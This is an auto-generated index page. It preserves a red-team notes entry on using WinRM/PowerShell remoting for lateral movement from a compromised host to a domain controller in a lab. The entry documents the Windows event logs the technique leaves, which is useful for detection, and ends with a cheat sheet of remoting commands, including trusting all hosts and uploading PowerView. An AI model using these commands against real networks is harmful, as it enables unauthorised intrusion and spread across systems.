---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# WinRM for Lateral Movement

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-lateral-movement-t1028-winrm-for-lateral-movement` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/lateral-movement/t1028-winrm-for-lateral-movement.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [WinRM for Lateral Movement](../../topics/offensive-security/winrm-for-lateral-movement.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-lateral-movement-t1028-winrm-for-lateral-movement |
| name | WinRM for Lateral Movement |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/lateral-movement/t1028-winrm-for-lateral-movement.md |

## Preserved Source Material

````yaml
_asset_filenames:
- winrm-eventlogs.png
- winrm-local-logon-events.png
- winrm-logons-both.png
- winrm-session-information.png
- winrm-shell.png
- wsmprovhost-calc-sysmon (1).png
- wsmprovhost-calc.png
_body: "---\ndescription: PowerShell remoting for lateral movement.\n---\n\n# WinRM for Lateral Movement\n\n## Execution\n\
  \nAttacker establishing a PSRemoting session from a compromised system `10.0.0.2` to a domain controller `dc-mantvydas`\
  \ at `10.0.0.6`:\n\n{% code title=\"attacker@10.0.0.2\" %}\n```csharp\nNew-PSSession -ComputerName dc-mantvydas -Credential\
  \ (Get-Credential)\n\n  Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability\n\
  \ -- ----            ------------    ------------    -----         -----------------     ------------\n  1 Session1    \
  \    dc-mantvydas    RemoteMachine   Opened        Microsoft.PowerShell     Available\n\nPS C:\\Users\\mantvydas> Enter-PSSession\
  \ 1\n[dc-mantvydas]: PS C:\\Users\\spotless\\Documents> calc.exe\n```\n{% endcode %}\n\n## Observations\n\nNote the process\
  \ ancestry:\n\n![](../../.gitbook/assets/wsmprovhost-calc.png)\n\n![](<../../.gitbook/assets/wsmprovhost-calc-sysmon (1).png>)\n\
  \nOn the host that initiated the connection, a `4648` logon attempt is logged, showing what process initiated it, the hostname\
  \ where it connected to and which account was used:\n\n![](../../.gitbook/assets/winrm-local-logon-events.png)\n\nThe below\
  \ graphic shows that the logon events `4648` annd `4624` are being logged on both the system that initiated the connection\
  \ (`pc-mantvydas - 4648`) and the system that it logged on to (`dc-mantvydas - 4624`):\n\n![](../../.gitbook/assets/winrm-logons-both.png)\n\
  \nAdditionally, `%SystemRoot%\\System32\\Winevt\\Logs\\Microsoft-Windows-WinRM%4Operational.evtx` on the host that initiated\
  \ connection to the remote host, logs some interesting data for a task `WSMan Session initialize` :\n\n```markup\n- <Event\
  \ xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n- <System>\n  <Provider Name=\"Microsoft-Windows-WinRM\"\
  \ Guid=\"{A7975C8F-AC13-49F1-87DA-5A984A4AB417}\" /> \n  <EventID>6</EventID> \n  <Version>0</Version> \n  <Level>4</Level>\
  \ \n  <Task>3</Task> \n  <Opcode>1</Opcode> \n  <Keywords>0x4000000000000002</Keywords> \n\n  # connection iniation time\n\
  \  <TimeCreated SystemTime=\"2018-07-25T21:13:36.511895800Z\" /> \n  <EventRecordID>673</EventRecordID> \n\n  # a unique\
  \ connection ID\n  <Correlation ActivityID=\"{037F878B-8DF6-4F1A-BA51-432C3CDDCB47}\" /> \n\n  # process ID that initiated\
  \ the connection\n  <Execution ProcessID=\"3172\" ThreadID=\"2844\" /> \n  <Channel>Microsoft-Windows-WinRM/Operational</Channel>\
  \ \n  <Computer>PC-MANTVYDAS.offense.local</Computer> \n  <Security UserID=\"S-1-5-21-1731862936-2585581443-184968265-1001\"\
  \ /> \n  </System>\n- <EventData>\n\n  # remote host the connection was initiated to\n  <Data Name=\"connection\">dc-mantvydas/wsman?PSVersion=5.1.14409.1005</Data>\
  \ \n  </EventData>\n  </Event>\n```\n\n...same as above just in the actual screenshot:\n\n![](../../.gitbook/assets/winrm-eventlogs.png)\n\
  \n![](../../.gitbook/assets/winrm-session-information.png)\n\nSince we entered into a PS Shell on the remote system `(Enter-PSSession)`\
  \ , there is another interesting log showing the establishment of a remote shell - note that the ShellID corresponds to\
  \ the earlier observed `Correlation ActivityID`:\n\n![](../../.gitbook/assets/winrm-shell.png)\n\n## Additional Useful Commands\n\
  \n[Jules Adriaens](https://twitter.com/@Expl0itabl3) reached out to me and suggested to add the following useful commands,\
  \ so here they are:\n\n```csharp\n# Enable PowerShell Remoting on the target (box needs to be compromised first)\nEnable-PSRemoting\
  \ -force\n\n# Check if a given system is listening on WinRM port\nTest-NetConnection <IP> -CommonTCPPort WINRM\n\n# Trust\
  \ all hosts:\nSet-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force\n\n# Check what hosts are trusted\nGet-Item\
  \ WSMan:\\localhost\\Client\\TrustedHosts\n\n# Execute command on remote host\nInvoke-Command <host> -Credential $cred -ScriptBlock\
  \ {Hostname}\n\n# Interactive session with explicit credentials\nEnter-PSSession <host> -Credential <domain>\\<user>\n\n\
  # Interactive session using Kerberos:\nEnter-PSSession <host> -Authentication Kerberos\n\n# Upload file to remote session\n\
  Copy-Item -Path C:\\Temp\\PowerView.ps1 -Destination C:\\Temp\\ -ToSession (Get-PSSession)\n\n# Download file from remote\
  \ session\nCopy-Item -Path C:\\Users\\Administrator\\Desktop\\test.txt -Destination C:\\Temp\\ -FromSession (Get-PSSession)\n\
  ```\n\n## References\n\n{% embed url=\"http://www.hurryupandwait.io/blog/a-look-under-the-hood-at-powershell-remoting-through-a-ruby-cross-plaform-lens\"\
  \ %}\n\n{% embed url=\"https://attack.mitre.org/wiki/Technique/T1028\" %}"
_relative_path: offensive-security/lateral-movement/t1028-winrm-for-lateral-movement.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/lateral-movement/t1028-winrm-for-lateral-movement.md
````
